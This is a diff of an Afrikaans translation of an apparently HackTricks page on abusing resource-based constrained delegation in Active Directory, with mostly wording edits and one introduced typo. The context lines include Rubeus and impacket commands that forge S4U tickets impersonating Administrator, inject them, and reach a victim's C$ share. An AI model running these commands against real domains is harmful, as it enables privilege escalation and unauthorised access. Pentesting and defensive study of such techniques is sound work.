@@ -14,7 +14,7 @@ Nog 'n belangrike verskil van hierdie Beperkte Afvaardiging teenoor die ander af
 ### Nuwe Konsepte
 
 Terug by Beperkte Afvaardiging is daar gesê dat die **`TrustedToAuthForDelegation`** vlag binne die _userAccountControl_ waarde van die gebruiker nodig is om 'n **S4U2Self** uit te voer. Maar dit is nie heeltemal waar nie.\
-Die werklikheid is dat selfs sonder daardie waarde, jy 'n **S4U2Self** teen enige gebruiker kan uitvoer as jy 'n **diens** (het 'n SPN) is, maar, as jy **`TrustedToAuthForDelegation`** het, sal die teruggegee TGS **Forwardable** wees en as jy **nie het nie** daardie vlag sal die teruggegee TGS **nie** **Forwardable** wees nie.
+Die werklikheid is dat selfs sonder daardie waarde, jy 'n **S4U2Self** teen enige gebruiker kan uitvoer as jy 'n **diens** (het 'n SPN) is, maar, as jy **`TrustedToAuthForDelegation`** het, sal die teruggegee TGS **Forwardable** wees en as jy **nie het** daardie vlag nie, sal die teruggegee TGS **nie** **Forwardable** wees nie.
 
 As die **TGS** wat in **S4U2Proxy** gebruik word **NIE Forwardable** is nie, sal dit **nie werk** om 'n **basiese Beperkte Afvaardiging** te misbruik nie. Maar as jy probeer om 'n **Hulpbron-gebaseerde beperkte afvaardiging te ontgin, sal dit werk**.
 
@@ -72,7 +72,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```
 ### Voer 'n volledige S4U-aanval uit (Windows/Rubeus)
 
-Eerstens, ons het die nuwe Rekenaar objek met die wagwoord `123456` geskep, so ons het die hash van daardie wagwoord nodig:
+Eerstens, ons het die nuwe rekenaarobjek met die wagwoord `123456` geskep, so ons het die hash van daardie wagwoord nodig:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
@@ -115,7 +115,7 @@ Notes
 ### Toegang
 
 Die laaste opdraglyn sal die **volledige S4U-aanval uitvoer en die TGS** van Administrator na die slagoffer-gasheer in **geheue** inspuit.\
-In hierdie voorbeeld is 'n TGS vir die **CIFS** diens van Administrator aangevra, so jy sal toegang hê tot **C$**:
+In hierdie voorbeeld is 'n TGS vir die **CIFS** diens van Administrator aangevra, so jy sal in staat wees om toegang te verkry tot **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
@@ -125,7 +125,7 @@ Leer meer oor die [**beskikbare dienskaartjies hier**](silver-ticket.md#availabl
 
 ## Opname, oudit en skoonmaak
 
-### Opname van rekenaars met RBCD geconfigureer
+### Tel rekenaars met RBCD geconfigureer
 
 PowerShell (ontsleuteling van die SD om SIDs op te los):
 ```powershell
@@ -167,22 +167,24 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 
 - **`KDC_ERR_ETYPE_NOTSUPP`**: Dit beteken dat kerberos gekonfigureer is om nie DES of RC4 te gebruik nie en jy verskaf net die RC4-hash. Verskaf aan Rubeus ten minste die AES256-hash (of verskaf net die rc4, aes128 en aes256 hashes). Voorbeeld: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
 - **`KRB_AP_ERR_SKEW`**: Dit beteken dat die tyd van die huidige rekenaar verskil van die een van die DC en kerberos werk nie behoorlik nie.
-- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om aan te meld nie. Jy mag dalk vergeet het om die "$" binne die gebruikersnaam te plaas toe jy die hashes genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`preauth_failed`**: Dit beteken dat die gegewe gebruikersnaam + hashes nie werk om in te log nie. Jy mag dalk vergeet het om die "$" binne die gebruikersnaam te plaas toe jy die hashes genereer (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Dit kan beteken:
 - Die gebruiker wat jy probeer om te verteenwoordig kan nie toegang tot die verlangde diens verkry nie (omdat jy dit nie kan verteenwoordig nie of omdat dit nie genoeg voorregte het nie)
 - Die gevraagde diens bestaan nie (as jy vir 'n kaartjie vir winrm vra maar winrm nie loop nie)
 - Die fakecomputer wat geskep is, het sy voorregte oor die kwesbare bediener verloor en jy moet dit teruggee.
 - Jy misbruik klassieke KCD; onthou RBCD werk met nie-oorplaasbare S4U2Self kaartjies, terwyl KCD oorplaasbare vereis.
 
-## Aantekeninge, relays en alternatiewe
+## Aantekeninge, relais en alternatiewe
 
 - Jy kan ook die RBCD SD oor AD Web Services (ADWS) skryf as LDAP gefiltreer is. Sien:
+
 
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Kerberos relay kettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te bereik. Sien praktiese eind-tot-eind voorbeelde:
+- Kerberos relaiskettings eindig dikwels in RBCD om plaaslike SYSTEM in een stap te bereik. Sien praktiese eind-tot-eind voorbeelde:
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
@@ -196,6 +198,7 @@ adws-enumeration.md
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 - Impacket rbcd.py (amptelik): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
-- Vinnige Linux cheatsheet met onlangse sintaksis: https://tldrbins.github.io/rbcd/
+- Vinning Linux cheatsheet met onlangse sintaksis: https://tldrbins.github.io/rbcd/
+
 
 {{#include ../../banners/hacktricks-training.md}}
